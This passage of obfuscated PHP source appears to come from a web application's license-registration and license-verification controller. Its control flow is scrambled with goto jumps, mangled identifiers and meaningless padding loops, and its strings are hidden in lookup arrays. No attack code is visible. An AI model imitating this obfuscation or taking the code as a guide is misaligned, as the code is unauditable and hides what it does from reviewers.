câ«° Ş£¾; d£½òƒ¹ùö: $f‰—²¬ˆ[39]($f‰—²¬ˆ[42], isset($eÊÙí—’‹’[2]) && $eÊÙí—’‹’[0] ? $eÊÙí—’‹’[2] : $this->defaultAction); $eÓ‘³ë¢ğí = $eÍëŒ™ˆ¥Ô[591]; while (strlen($eÓ‘³ë¢ğí) < $eÍëŒ™ˆ¥Ô[580]) { if (!$eÓ‘³ë¢ğí) { break; } $eÓ‘³ë¢ğí++; } goto Eåö—¥Àµ; aå±Ö«æŒ: $eê‘·Ôôµ‘ = $eÍëŒ™ˆ¥Ô[590]; if (strlen($eê‘·Ôôµ‘) < $eÍëŒ™ˆ¥Ô[580]) { die; } $eÊÙí—’‹’ = $GLOBALS[$f‰—²¬ˆ[22]][$f‰—²¬ˆ[23]]; goto D¶ÏøÓâ¨Ã; f÷½£š…‹: $bÒèœÕ‹ø£ = $eÍëŒ™ˆ¥Ô[588]; if (strlen($bÒèœÕ‹ø£) < $eÍëŒ™ˆ¥Ô[589]) { die; } $this->{$_SERVER[šãè][38]}(); goto aå±Ö«æŒ; CÕ¡ìƒ÷¡æ: if (!$C§éñ¥½ÈÔ) { die; } $this->{$_SERVER[šãè][45]}(); if ($f‰—²¬ˆ[19]($eÊÙí—’‹’) >= 3) { $this->{$_SERVER[šãè][21]}($BŒÔò¾äô”); } else { $this->{$_SERVER[šãè][21]}(ACTION); } goto CÚê¥µ£; Eåö—¥Àµ: $f‰—²¬ˆ[39]($f‰—²¬ˆ[43], MOD . $f‰—²¬ˆ[1] . ST . $f‰—²¬ˆ[1] . ACT); $_SERVER[$f‰—²¬ˆ[44]] = $f‰—²¬ˆ[6](ACTION); $C§éñ¥½ÈÔ = $eÍëŒ™ˆ¥Ô[592]; goto CÕ¡ìƒ÷¡æ; câ«° Ş£¾: $eÍëŒ™ˆ¥Ô =& $_SERVER[ÉóçÄÇ]; $f‰—²¬ˆ =& $_SERVER[šãè]; $this->{$_SERVER[šãè][37]}(); goto f÷½£š…‹; D¶ÏøÓâ¨Ã: $BŒÔò¾äô” = $GLOBALS[$f‰—²¬ˆ[22]][$f‰—²¬ˆ[28]]; $f‰—²¬ˆ[39]($f‰—²¬ˆ[40], isset($eÊÙí—’‹’[0]) && $eÊÙí—’‹’[0] ? $eÊÙí—’‹’[0] : $this->defaultModule); $f‰—²¬ˆ[39]($f‰—²¬ˆ[41], isset($eÊÙí—’‹’[1]) && $eÊÙí—’‹’[0] ? $eÊÙí—’‹’[1] : $this->defaultController); goto d£½òƒ¹ùö; CÚê¥µ£: } private $vwxd7ad09c58 = array(); private $fjny2ecd3534 = ''; public function pglrea3a82c8() { goto cÄ¯„‡èµ†; cÃî¸óæÎ: $this->{$_SERVER[šãè][3]}($d‚Õİìò„‚[59], array($this, $d‚Õİìò„‚[60])); goto dèö¨‹ß©; cëÇƒÉŠ¬: if (!$F¸Õ¦Ã³Çõ) { die; } $this->{$_SERVER[šãè][49]}(); $BøÓ¬«­· = $eÖ¾—®êÖŒ[594]; goto C«õˆÒ“•; C¸šƒĞ§Î‘: $this->{$_SERVER[šãè][47]}(); $this->{$_SERVER[šãè][48]}(); $F¸Õ¦Ã³Çõ = $eÖ¾—®êÖŒ[593]; goto cëÇƒÉŠ¬; eêá‹Ş¢‘: $this->{$_SERVER[šãè][52]}(); $C‚ÈæÊ–Ü² = $eÖ¾—®êÖŒ[595]; if (!$C‚ÈæÊ–Ü²) { return; } goto BğÕÌÙŠ‹; A¼ò¥¼ªÓ…: $dñ›ß¾Á†• = $eÖ¾—®êÖŒ[597]; while (strlen($dñ›ß¾Á†•) < $eÖ¾—®êÖŒ[589]) { if (!$dñ›ß¾Á†•) { break; } $dñ›ß¾Á†•++; } $this->{$_SERVER[šãè][3]}($d‚Õİìò„‚[57], array($this, $d‚Õİìò„‚[58])); goto cÃî¸óæÎ; BğÕÌÙŠ‹: $this->{$_SERVER[šãè][3]}($d‚Õİìò„‚[53], array($this, $d‚Õİìò„‚[54])); $aß‹©‰£¥ = $eÖ¾—®êÖŒ[596]; $this->{$_SERVER[šãè][3]}($d‚Õİìò„‚[55], array($this, $d‚Õİìò„‚[56])); goto A¼ò¥¼ªÓ…; C«õˆÒ“•: if (strlen($BøÓ¬«­·) < $eÖ¾—®êÖŒ[570]) { return; } $this->{$_SERVER[šãè][50]}(); $this->{$_SERVER[šãè][51]}(); goto eêá‹Ş¢‘; cÄ¯„‡èµ†: $eÖ¾—®êÖŒ =& $_SERVER[ÉóçÄÇ]; $d‚Õİìò„‚ =& $_SERVER[šãè]; $this->{$_SERVER[šãè][46]}(); goto C¸šƒĞ§Î‘; dèö¨‹ß©: } public function umrl35c38afb($bÆªåÖò¿í) { goto C¬–ô‘í·; AÂë½›Ë·¯: if (strlen($a¥ÕŒÂ·ÉÒ) < $FïôéÖĞÓÅ[589]) { return; } $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$eÈ¡¸Œ‚×š[108]] = array($eÈ¡¸Œ‚×š[109] => (int) $E÷†±Ñ´†õ[$eÈ¡¸Œ‚×š[110]], $eÈ¡¸Œ‚×š[111] => (int) $eÈ¡¸Œ‚×š[112]($E÷†±Ñ´†õ, $eÈ¡¸Œ‚×š[113], 0)); $Céì§ÕÏ¥… = $FïôéÖĞÓÅ[605]; goto aí–å÷ õ; CˆÀ†˜¯: $cµÔ…¡ˆ£Š = $FïôéÖĞÓÅ[601]; unset($bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$eÈ¡¸Œ‚×š[76]]); $EŒ‘Œ±ë’Ü = $FïôéÖĞÓÅ[602]; goto aÚÃ²ƒŠ¼ô; fèØÊ‡œ«Í: return $bÆªåÖò¿í; goto f‰¶Æß†Ğ»; B‹ÕÖ¶’‹¢: $f÷èìä¶í± = $FïôéÖĞÓÅ[599]; foreach ($e±ƒáÅÓíù as $FÒƒ¾Ò³â†) { $DŞ•¯äØùï = $GLOBALS[$eÈ¡¸Œ‚×š[100]][$eÈ¡¸Œ‚×š[101]][$FÒƒ¾Ò³â†]; if (isset($f×´«¹•ß[$FÒƒ¾Ò³â†])) { $DŞ•¯äØùï = $f×´«¹•ß[$FÒƒ¾Ò³â†]; } $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$FÒƒ¾Ò³â†] = $DŞ•¯äØùï; } $E÷†±Ñ´†õ = $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$eÈ¡¸Œ‚×š[76]]; goto d¦Ø¤ÂÙé ; E£Ş¡¾ÛÆõ: $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[126]] = $this->fjny2ecd3534; if ($f×´«¹•ß[$eÈ¡¸Œ‚×š[126]] != $eÈ¡¸Œ‚×š[127]) { $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[128]] = $f×´«¹•ß[$eÈ¡¸Œ‚×š[128]]; $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[129]] = $f×´«¹•ß[$eÈ¡¸Œ‚×š[129]]; $AßŞêÍ´î“ = $eÈ¡¸Œ‚×š[130](10) . $this->fjny2ecd3534 . $eÈ¡¸Œ‚×š[130](5); $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[131]][$eÈ¡¸Œ‚×š[132]] = $this->{$_SERVER[šãè][133]}($AßŞêÍ´î“, $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[119]]); } if ($this->fjny2ecd3534 == $eÈ¡¸Œ‚×š[127]) { $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$eÈ¡¸Œ‚×š[108]][$eÈ¡¸Œ‚×š[113]] = 0; } goto Fï’í¿Î´; Bß§ŸŠğËÀ: $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[123]] = $eÈ¡¸Œ‚×š[124]($eÈ¡¸Œ‚×š[125]()); $dê™Ëª‘Ëé = $FïôéÖĞÓÅ[609]; if (!$dê™Ëª‘Ëé) { die; } goto E£Ş¡¾ÛÆõ; aí–å÷ õ: while (strlen($Céì§ÕÏ¥…) < $FïôéÖĞÓÅ[606]) { if (!$Céì§ÕÏ¥…) { break; } $Céì§ÕÏ¥…++; } $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[115]] = $eÈ¡¸Œ‚×š[116]($eÈ¡¸Œ‚×š[117])->{$_SERVER[šãè][118]}(); $eÍ¾ã‡†œ¶ = $FïôéÖĞÓÅ[607]; goto c‡—•½ƒ™; Fï’í¿Î´: $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[134]] = $eÈ¡¸Œ‚×š[112]($this->vwxd7ad09c58, $eÈ¡¸Œ‚×š[135], $eÈ¡¸Œ‚×š[10]); $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[136]] = $eÈ¡¸Œ‚×š[112]($this->vwxd7ad09c58, $eÈ¡¸Œ‚×š[137], $eÈ¡¸Œ‚×š[10]); if ($eÈ¡¸Œ‚×š[112]($GLOBALS, $eÈ¡¸Œ‚×š[138]) && $this->config[$eÈ¡¸Œ‚×š[139]]) { $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[140]] = WEB_ROOT; } goto fèØÊ‡œ«Í; c‡—•½ƒ™: while (strlen($eÍ¾ã‡†œ¶) < $FïôéÖĞÓÅ[606]) { if (!$eÍ¾ã‡†œ¶) { break; } $eÍ¾ã‡†œ¶++; } $bÆªåÖò¿í[$eÈ¡¸Œ‚×š[114]][$eÈ¡¸Œ‚×š[119]] = $eÈ¡¸Œ‚×š[120]($_SERVER[$eÈ¡¸Œ‚×š[121]] . $f×´«¹•ß[$eÈ¡¸Œ‚×š[122]]); $eõ’‚é‰ö = $FïôéÖĞÓÅ[608]; goto Bß§ŸŠğËÀ; a§ƒ‡Œî: $eÛ‚›ÍÀî¹ = $FïôéÖĞÓÅ[598]; if (!$eÛ‚›ÍÀî¹) { return; } $e±ƒáÅÓíù = array($eÈ¡¸Œ‚×š[64], $eÈ¡¸Œ‚×š[65], $eÈ¡¸Œ‚×š[66], $eÈ¡¸Œ‚×š[67], $eÈ¡¸Œ‚×š[68], $eÈ¡¸Œ‚×š[69], $eÈ¡¸Œ‚×š[70], $eÈ¡¸Œ‚×š[71], $eÈ¡¸Œ‚×š[72], $eÈ¡¸Œ‚×š[73], $eÈ¡¸Œ‚×š[74], $eÈ¡¸Œ‚×š[75], $eÈ¡¸Œ‚×š[76], $eÈ¡¸Œ‚×š[77], $eÈ¡¸Œ‚×š[78], $eÈ¡¸Œ‚×š[79], $eÈ¡¸Œ‚×š[80], $eÈ¡¸Œ‚×š[81], $eÈ¡¸Œ‚×š[82], $eÈ¡¸Œ‚×š[83], $eÈ¡¸Œ‚×š[84], $eÈ¡¸Œ‚×š[85], $eÈ¡¸Œ‚×š[86], $eÈ¡¸Œ‚×š[87], $eÈ¡¸Œ‚×š[88], $eÈ¡¸Œ‚×š[89], $eÈ¡¸Œ‚×š[90], $eÈ¡¸Œ‚×š[91], $eÈ¡¸Œ‚×š[92], $eÈ¡¸Œ‚×š[93], $eÈ¡¸Œ‚×š[94], $eÈ¡¸Œ‚×š[95], $eÈ¡¸Œ‚×š[96], $eÈ¡¸Œ‚×š[97], $eÈ¡¸Œ‚×š[98], $eÈ¡¸Œ‚×š[99]); goto B‹ÕÖ¶’‹¢; d¦Ø¤ÂÙé : $DÌ˜ğÎÈĞÛ = $FïôéÖĞÓÅ[600]; unset($bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[104]][$eÈ¡¸Œ‚×š[105]]); unset($bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[104]][$eÈ¡¸Œ‚×š[106]]); goto CˆÀ†˜¯; aÚÃ²ƒŠ¼ô: while ($EŒ‘Œ±ë’Ü < $FïôéÖĞÓÅ[603]) { if ($EŒ‘Œ±ë’Ü >= 0) { break; } $EŒ‘Œ±ë’Ü++; } unset($bÆªåÖò¿í[$eÈ¡¸Œ‚×š[102]][$eÈ¡¸Œ‚×š[103]][$eÈ¡¸Œ‚×š[107]]); $a¥ÕŒÂ·ÉÒ = $FïôéÖĞÓÅ[604]; goto AÂë½›Ë·¯; C¬–ô‘í·: $FïôéÖĞÓÅ =& $_SERVER[ÉóçÄÇ]; $eÈ¡¸Œ‚×š =& $_SERVER[šãè]; $f×´«¹•ß = $eÈ¡¸Œ‚×š[61]($eÈ¡¸Œ‚×š[62])->{$_SERVER[šãè][63]}(); goto a§ƒ‡Œî; f‰¶Æß†Ğ»: } private function qnipc9253231() { goto d‰–ç¸¤Ğ; dÜîÑ£”½: $B¶«²‡¯‹[13](array($B¶«²‡¯‹[157], $B¶«²‡¯‹[158]), $Bìõ®’ßÏ); $AÄïÜ‹ÆÍ‹ = $EÚÓ©Ù×®¤[614]; goto Fğ¾öÓ²À½; A±·Ÿ½Ü˜­: if ($this->fjny2ecd3534 == $B¶«²‡¯‹[127]) { return; } $C›½œŞ‰™ = array($B¶«²‡¯‹[159], $B¶«²‡¯‹[160], $B¶«²‡¯‹[161], $B¶«²‡¯‹[162], $B¶«²‡¯‹[163], $B¶«²‡¯‹[164]); $Cƒ×Â©Ù’Ç = $EÚÓ©Ù×®¤[611]; goto bŸ‡À”°ç¸; bŸ‡À”°ç¸: while (strlen($Cƒ×Â©Ù’Ç) < $EÚÓ©Ù×®¤[570]) { if (!$Cƒ×Â©Ù’Ç) { break; } $Cƒ×Â©Ù’Ç++; } $FÉ”‡ìŠî¾ = $B¶«²‡¯‹[61]($B¶«²‡¯‹[62])->{$_SERVER[šãè][63]}(); $a¹‰«àÔÌñ = $EÚÓ©Ù×®¤[612]; goto eÍ©Æ‚ƒ“Ç; eÍ©Æ‚ƒ“Ç: if (!$a¹‰«àÔÌñ) { die; } $Bìõ®’ßÏ = array($B¶«²‡¯‹[165] => $FÉ”‡ìŠî¾[$B¶«²‡¯‹[64]], $B¶«²‡¯‹[166] => $FÉ”‡ìŠî¾[$B¶«²‡¯‹[65]], $B¶«²‡¯‹[167] => $B¶«²‡¯‹[10]); foreach ($C›½œŞ‰™ as $f¶˜ºÎ‚ùÅ) { if (!isset($FÉ”‡ìŠî¾[$f¶˜ºÎ‚ùÅ]) || !$FÉ”‡ìŠî¾[$f¶˜ºÎ‚ùÅ]) { continue; } $Bìõ®’ßÏ[$f¶˜ºÎ‚ùÅ] = $FÉ”‡ìŠî¾[$f¶˜ºÎ‚ùÅ]; $Fİ„ë ‚Šğ = $EÚÓ©Ù×®¤[613]; while (strlen($Fİ„ë ‚Šğ) < $EÚÓ©Ù×®¤[589]) { if (!$Fİ„ë ‚Šğ) { break; } $Fİ„ë ‚Šğ++; } } goto dÜîÑ£”½; d‰–ç¸¤Ğ: $EÚÓ©Ù×®¤ =& $_SERVER[ÉóçÄÇ]; $B¶«²‡¯‹ =& $_SERVER[šãè]; if ($_SERVER[$B¶«²‡¯‹[44]] == $B¶«²‡¯‹[141]) { goto eÒ‰Øîàó; E½ÏŸÁÜ¨Á: $B¶«²‡¯‹[13](array($B¶«²‡¯‹[157], $B¶«²‡¯‹[158]), $Bìõ®’ßÏ); goto E„”ò‹ÁËä; DôË±åÑÀ±: $Bìõ®’ßÏ = array($B¶«²‡¯‹[156] => $bçˆËìœ¥); $EÄ—Ø¨­ŒË = $EÚÓ©Ù×®¤[610]; if (strlen($EÄ—Ø¨­ŒË) < $EÚÓ©Ù×®¤[580]) { return; } goto E½ÏŸÁÜ¨Á; eÒ‰Øîàó: $bçˆËìœ¥ = array($B¶«²‡¯‹[126] => $this->fjny2ecd3534, $B¶«²‡¯‹[142] => $this->{$_SERVER[šãè][143]}(), $B¶«²‡¯‹[144] => $B¶«²‡¯‹[61]($B¶«²‡¯‹[145])->{$_SERVER[šãè][146]}()); if ($this->fjny2ecd3534 != $B¶«²‡¯‹[127]) { $c‰ñ’ßÇå  = $B¶«²‡¯‹[112]($this->vwxd7ad09c58, $B¶«²‡¯‹[147]); if ($c‰ñ’ßÇå ) { $bçˆËìœ¥[$B¶«²‡¯‹[148]] = $c‰ñ’ßÇå ; $bçˆËìœ¥[$B¶«²‡¯‹[149]] = $B¶«²‡¯‹[150]($B¶«²‡¯‹[112]($this->vwxd7ad09c58, $B¶«²‡¯‹[151])); $bçˆËìœ¥[$B¶«²‡¯‹[152]] = $B¶«²‡¯‹[112]($this->vwxd7ad09c58, $B¶«²‡¯‹[137]); } } $bçˆËìœ¥ = $this->{$_SERVER[šãè][153]}($B¶«²‡¯‹[154]($bçˆËìœ¥), $B¶«²‡¯‹[120]($B¶«²‡¯‹[155])); goto DôË±åÑÀ±; E„”ò‹ÁËä: } goto A±·Ÿ½Ü˜­; Fğ¾öÓ²À½: } private function pugfa437e293() { goto fÛòÍ¾Å³±; A¶Å»—å¼Š: $AòÍ”óÇù[$aÏ²Ãì´İŒ] = $D¯Õİ‚¬çÍ; $a´•…©”¢©[61]($a´•…©”¢©[11])->{$_SERVER[šãè][232]}($fÚ¹“Ÿ•ñ[$a´•…©”¢©[233]], array($a´•…©”¢©[234] => $AòÍ”óÇù)); $bëœŞµ‚Ö = $e­Ìº‹î„[623]; goto aÊô—ßŒø²; C‚”ÅÁµæ÷: $AòÍ”óÇù = array(); $fàŞÈéø­Ğ = $e­Ìº‹î„[622]; if (strlen($fàŞÈéø­Ğ) < $e­Ìº‹î„[580]) { die; } goto A¶Å»—å¼Š; e·ÓØøª¶: if ($aàÈÒŞ×[$a´•…©”¢©[174]]) { $dÖÖÅ‚ğ¢³[$a´•…©”¢©[218]] = $aàÈÒŞ×[$a´•…©”¢©[174]]; } $b½ÍÏ‚×¥° = $a´•…©”¢©[25]($a´•…©”¢©[120]($dÖÖÅ‚ğ¢³[$a´•…©”¢©[216]]), 10, 10); $céÄ°³Ô‰ = $b½ÍÏ‚×¥° . $dÖÖÅ‚ğ¢³[$a´•…©”¢©[126]] . $dÖÖÅ‚ğ¢³[$a´•…©”¢©[218]]; goto A°†‘©Ï˜ç; F‘âÁƒ¶¡‘: if (!$a´•…©”¢©[112]($GLOBALS, $a´•…©”¢©[138])) { die; } $có³”î³Ú³ = $GLOBALS[$a´•…©”¢©[22]]; if (isset($có³”î³Ú³[$a´•…©”¢©[169]])) { $this->{$_SERVER[šãè][170]}(); die; } goto D¸„ĞĞ¤‚Ñ; A°†‘©Ï˜ç: $bšµ¸ò¸° = $e­Ìº‹î„[617]; if (strlen($bšµ¸ò¸°) < $e­Ìº‹î„[606]) { die; } $dÖÖÅ‚ğ¢³[$a´•…©”¢©[128]] = $a´•…©”¢©[220]($a´•…©”¢©[124]($this->{$_SERVER[šãè][153]}($céÄ°³Ô‰, $a´•…©”¢©[221]))); goto bƒˆ“ÓÙÀ; dÍİê¹‹ã™: $fÚ¹“Ÿ•ñ = $A£¯œÏœ©‚[$a´•…©”¢©[231]]; $bÀŸì† = $e­Ìº‹î„[621]; while ($bÀŸì† < $e­Ìº‹î„[580]) { if ($bÀŸì† >= 0) { break; } $bÀŸì†++; } goto C‚”ÅÁµæ÷; bƒˆ“ÓÙÀ: $cÀæªë±±Ê = $e­Ìº‹î„[618]; $BÊªĞ’° = $a´•…©”¢©[130](16); $fŠ÷´÷©Ë = $e­Ìº‹î„[619]; goto A¯†‘–Òì¸; A¢…çİ£Üò: $D¤²åºáà = $e­Ìº‹î„[598]; while ($D¤²åºáà < $e­Ìº‹î„[589]) { if ($D¤²åºáà >= 0) { break; } $D¤²åºáà++; } $A£¯œÏœ©‚ = $a´•…©”¢©[228]($a´•…©”¢©[61]($a´•…©”¢©[11])->{$_SERVER[šãè][229]}(), $a´•…©”¢©[230]); goto dÍİê¹‹ã™; a‰©Ñ˜áßÌ: $eÔ¬‚¡÷î­ = $e­Ìº‹î„[620]; if ($b¢ÄÑÄš‡ƒ[$a´•…©”¢©[223]] && $b¢ÄÑÄš‡ƒ[$a´•…©”¢©[223]] >= 1) { $a´•…©”¢©[61]($a´•…©”¢©[62])->{$_SERVER[šãè][224]}($a´•…©”¢©[225], $a´•…©”¢©[226]); } $a´•…©”¢©[61]($a´•…©”¢©[62])->{$_SERVER[šãè][227]}($dÖÖÅ‚ğ¢³); goto Aè­á¤¡×™; aÁˆŒİ¨ñ: $c‹£„®–¬Â = $a´•…©”¢©[120]($_SERVER[$a´•…©”¢©[121]] . $dˆáÇ”Ù‹´); $D†´·ğÊÂ = $e­Ìº‹î„[615]; if (strlen($D†´·ğÊÂ) < $e­Ìº‹î„[606]) { die; } goto bïÄ„£·ÃÃ; bˆ¶êùµÃÂ: $DöÁ„…ÀˆÄ = $this->{$_SERVER[šãè][206]}($b¢ÄÑÄš‡ƒ[$a´•…©”¢©[207]]); if (!$DöÁ„…ÀˆÄ || $DöÁ„…ÀˆÄ != $b¢ÄÑÄš‡ƒ[$a´•…©”¢©[151]]) { $e˜ÃáÓå’ï = array($a´•…©”¢©[208] => $a´•…©”¢©[61]($a´•…©”¢©[62])->{$_SERVER[šãè][63]}($a´•…©”¢©[122]), $a´•…©”¢©[209] => $_SERVER[$a´•…©”¢©[121]], $a´•…©”¢©[210] => $a´•…©”¢©[211](), $a´•…©”¢©[180] => $_SERVER[$a´•…©”¢©[181]]); $D¸Èšâßø” = $this->{$_SERVER[šãè][212]}($a´•…©”¢©[154]($e˜ÃáÓå’ï)); $this->{$_SERVER[šãè][189]}($a´•…©”¢©[213] . $D¸Èšâßø”); $a´•…©”¢©[172]($a´•…©”¢©[204]($a´•…©”¢©[214]), !0); } $dÖÖÅ‚ğ¢³ = array($a´•…©”¢©[215] => $aàÈÒŞ×[$a´•…©”¢©[171]], $a´•…©”¢©[216] => $b¢ÄÑÄš‡ƒ[$a´•…©”¢©[217]], $a´•…©”¢©[218] => $a´•…©”¢©[130](16), $a´•…©”¢©[126] => $b¢ÄÑÄš‡ƒ[$a´•…©”¢©[219]]); goto e·ÓØøª¶; D¸„ĞĞ¤‚Ñ: if (!isset($có³”î³Ú³[$a´•…©”¢©[171]]) || $a´•…©”¢©[24]($có³”î³Ú³[$a´•…©”¢©[171]]) != 16) { $a´•…©”¢©[172]($a´•…©”¢©[173] . $có³”î³Ú³[$a´•…©”¢©[171]], !1); } $dˆáÇ”Ù‹´ = $a´•…©”¢©[61]($a´•…©”¢©[62])->{$_SERVER[šãè][63]}($a´•…©”¢©[122]); $aàÈÒŞ× = array($a´•…©”¢©[171] => $có³”î³Ú³[$a´•…©”¢©[171]], $a´•…©”¢©[174] => $a´•…©”¢©[130](16), $a´•…©”¢©[175] => $a´•…©”¢©[155], $a´•…©”¢©[176] => $a´•…©”¢©[177], $a´•…©”¢©[178] => $_SERVER[$a´•…©”¢©[179]], $a´•…©”¢©[180] => $_SERVER[$a´•…©”¢©[181]], $a´•…©”¢©[182] => $_SERVER[$a´•…©”¢©[183]]); goto aÁˆŒİ¨ñ; A¯†‘–Òì¸: if (strlen($fŠ÷´÷©Ë) < $e­Ìº‹î„[570]) { return; } $dÍ‹ÓËù± = $BÊªĞ’° . $dÖÖÅ‚ğ¢³[$a´•…©”¢©[126]] . $this->{$_SERVER[šãè][153]}($a´•…©”¢©[120]($dÖÖÅ‚ğ¢³[$a´•…©”¢©[215]]), $BÊªĞ’°); $dÖÖÅ‚ğ¢³[$a´•…©”¢©[129]] = $a´•…©”¢©[124]($a´•…©”¢©[220]($this->{$_SERVER[šãè][153]}($dÍ‹ÓËù±, $a´•…©”¢©[222]))); goto a‰©Ñ˜áßÌ; bïÄ„£·ÃÃ: if ($có³”î³Ú³[$a´•…©”¢©[184]] == $a´•…©”¢©[185]) { $aÉì»œöæè = $this->{$_SERVER[šãè][153]}($c‹£„®–¬Â, $a´•…©”¢©[186]); $D¸Èšâßø” = $this->{$_SERVER[šãè][133]}($a´•…©”¢©[154]($aàÈÒŞ×), $c‹£„®–¬Â . $a´•…©”¢©[187], 3); $D¸Èšâßø” = $D¸Èšâßø” . $a´•…©”¢©[188] . $_SERVER[$a´•…©”¢©[179]]; $B¶¿ÅÑÖª• = $this->{$_SERVER[šãè][189]}($a´•…©”¢©[190] . $aÉì»œöæè . $a´•…©”¢©[191] . $D¸Èšâßø”, -1); $a´•…©”¢©[172]($B¶¿ÅÑÖª•, !0); } else { if ($có³”î³Ú³[$a´•…©”¢©[184]] == $a´•…©”¢©[192]) { $bîšÏ¬šºÚ = $a´•…©”¢©[25]($a´•…©”¢©[120]($a´•…©”¢©[193] . $c‹£„®–¬Â), 12, 15) . $a´•…©”¢©[194]; $D¸Èšâßø” = $this->{$_SERVER[šãè][195]}($a´•…©”¢©[2]($có³”î³Ú³[$a´•…©”¢©[196]]), $bîšÏ¬šºÚ, 2); $eƒ…‘´âõì = $a´•…©”¢©[197]($D¸Èšâßø”, !0); if (!$a´•…©”¢©[198]($eƒ…‘´âõì) || !$a´•…©”¢©[198]($eƒ…‘´âõì[$a´•…©”¢©[199]]) || $eƒ…‘´âõì[$a´•…©”¢©[171]] != !0) { $aì›Ü­ŸÀƒ = $a´•…©”¢©[200]; $c«¸×“‚µĞ = $eƒ…‘´âõì[$a´•…©”¢©[199]] ? $a´•…©”¢©[201] . $eƒ…‘´âõì[$a´•…©”¢©[199]] : $aì›Ü­ŸÀƒ; $a´•…©”¢©[172]($c«¸×“‚µĞ, !1); } else { $aàÈÒŞ×[$a´•…©”¢©[174]] = $eƒ…‘´âõì[$a´•…©”¢©[199]][$a´•…©”¢©[202]]; } } else { $eƒ…‘´âõì = $this->{$_SERVER[šãè][189]}($a´•…©”¢©[203], $aàÈÒŞ×, 10); $d«¥ĞËÏÙÖ = $e­Ìº‹î„[616]; if (!$d«¥ĞËÏÙÖ) { return; } } } if (!$a´•…©”¢©[198]($eƒ…‘´âõì) || !$a´•…©”¢©[198]($eƒ…‘´âõì[$a´•…©”¢©[199]]) || $eƒ…‘´âõì[$a´•…©”¢©[171]] != !0) { $aì›Ü­ŸÀƒ = $a´•…©”¢©[204]($a´•…©”¢©[205]); $c«¸×“‚µĞ = $eƒ…‘´âõì[$a´•…©”¢©[199]] ? $a´•…©”¢©[201] . $eƒ…‘´âõì[$a´•…©”¢©[199]] : $aì›Ü­ŸÀƒ; $a´•…©”¢©[172]($c«¸×“‚µĞ, !1); } $b¢ÄÑÄš‡ƒ = $eƒ…‘´âõì[$a´•…©”¢©[199]]; goto bˆ¶êùµÃÂ; Dµ’â‘±ö: $f¬É®àÍ³ = $e­Ìº‹î„[624]; if (!$f¬É®àÍ³) { die; } $this->{$_SERVER[šãè][235]}(); goto aîƒ«‰İ´¼; aÊô—ßŒø²: while (strlen($bëœŞµ‚Ö) < $e­Ìº‹î„[580]) { if (!$bëœŞµ‚Ö) { break; } $bëœŞµ‚Ö++; } $this->vwxd7ad09c58 = $b¢ÄÑÄš‡ƒ; $this->fjny2ecd3534 = $dÖÖÅ‚ğ¢³[$a´•…©”¢©[126]]; goto Dµ’â‘±ö; fÛòÍ¾Å³±: $e­Ìº‹î„ =& $_SERVER[ÉóçÄÇ]; $a´•…©”¢© =& $_SERVER[šãè]; if ($_SERVER[$a´•…©”¢©[44]] != $a´•…©”¢©[168]) { return; } goto F‘âÁƒ¶¡‘; FÔùÖáùÀ: $a‚Ø­¨±åÀ = $e­Ìº‹î„[627]; goto d²½ˆèŒƒ; Aè­á¤¡×™: $DŞ³ÌÑƒë¨ = $a´•…©”¢©[120]($_SERVER[$a´•…©”¢©[121]] . $a´•…©”¢©[220]($dˆáÇ”Ù‹´) . $dÖÖÅ‚ğ¢³[$a´•…©”¢©[216]]); $aÏ²Ãì´İŒ = $a´•…©”¢©[220]($a´•…©”¢©[25]($DŞ³ÌÑƒë¨, 10, 16)); $D¯Õİ‚¬çÍ = $this->{$_SERVER[šãè][133]}($a´•…©”¢©[154]($b¢ÄÑÄš‡ƒ), $DŞ³ÌÑƒë¨); goto A¢…çİ£Üò; cÜÇ·¨Õ™ö: $a˜ÍŠ´ä = $e­Ìº‹î„[626]; if (strlen($a˜ÍŠ´ä) < $e­Ìº‹î„[603]) { die; } $a´•…©”¢©[172]($a´•…©”¢©[204]($a´•…©”¢©[214]), !0); goto FÔùÖáùÀ; aîƒ«‰İ´¼: $EËøŠ™ÁÇŸ = $e­Ìº‹î„[625]; if (!$EËøŠ™ÁÇŸ) { die; } Cache::set($a´•…©”¢©[236] . $a´•…©”¢©[120]($dˆáÇ”Ù‹´ . $a´•…©”¢©[237]), $a´•…©”¢©[10]); goto cÜÇ·¨Õ™ö; d²½ˆèŒƒ: } private function licenseRegistSuccess() { $E”½Šæ…©± =& $_SERVER[šãè]; $d£å¿¼©®è = $E”½Šæ…©±[61]($E”½Šæ…©±[62])->{$_SERVER[šãè][63]}(); if ($d£å¿¼©®è[$E”½Šæ…©±[89]] != $E”½Šæ…©±[226]) { $E”½Šæ…©±[61]($E”½Šæ…©±[62])->{$_SERVER[šãè][227]}($E”½Šæ…©±[89], $E”½Šæ…©±[226]); } $E”½Šæ…©±[116]($E”½Šæ…©±[238])->{$_SERVER[šãè][239]}(!0); } private function pyad3688af68() { goto dÉÙÆ§Îİ; c¦ôëîª¯ä: if (strlen($B»Åƒ¦øµğ) < $EŒÚ© îø¥[570]) { die; } $this->fjny2ecd3534 = $fÆÃ³È…İ[127]; $FàÊñ®âùê = 